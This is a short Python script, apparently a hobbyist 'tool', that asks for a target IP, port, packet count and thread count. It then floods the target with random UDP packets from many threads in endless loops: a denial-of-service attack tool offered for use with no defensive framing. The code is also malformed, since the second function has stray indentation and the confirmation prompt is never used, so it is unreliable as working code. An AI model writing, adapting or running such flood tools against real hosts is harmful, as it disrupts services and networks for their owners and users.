#!/usr/bin/env python3
#Code by AxeL
import struct
import time
import random
import socket
import threading
import codecs
import os
import time
import sys

os.system("clear")
print("""
\033[94m
   _   _     _              ___  ____  
 | \ | | __| | __ _  __ _ / _ \|  _ \ 
 |  \| |/ _` |/ _` |/ _` | | | | |_) |
 | |\  | (_| | (_| | (_| | |_| |  __/ 
 |_| \_|\__,_|\__,_|\__, |\___/|_|    
                    |___/             
               Tools By AxeL
""")

ip = str(input("\033[95m=====> + IP Target    : "))
port = int(input("=====> + PORT Target  : "))
times = int(input("=====> $ Send PACKETS : "))
threads = int(input("=====> $ Send THREADS : "))
choice = str(input("=====> × Ready? (y/n) : "))

def run(): 
         data = random._urandom(1024) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(f" \033[92m[•] AxeL Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!") 
                 except: 
                         print(f" \033[92m[×] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!") 
  
 def run2(): 
         data = random._urandom(17) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(f" \033[92m[•] AxeL Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!") 
                 except: 
                         print(f" \033[92m[×] ZieLx Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!") 
 
# Threads
for y in range(threads):
	th = threading.Thread(target = run)
	th.start()
else:
		th = threading.Thread(target = run2)
		th.start()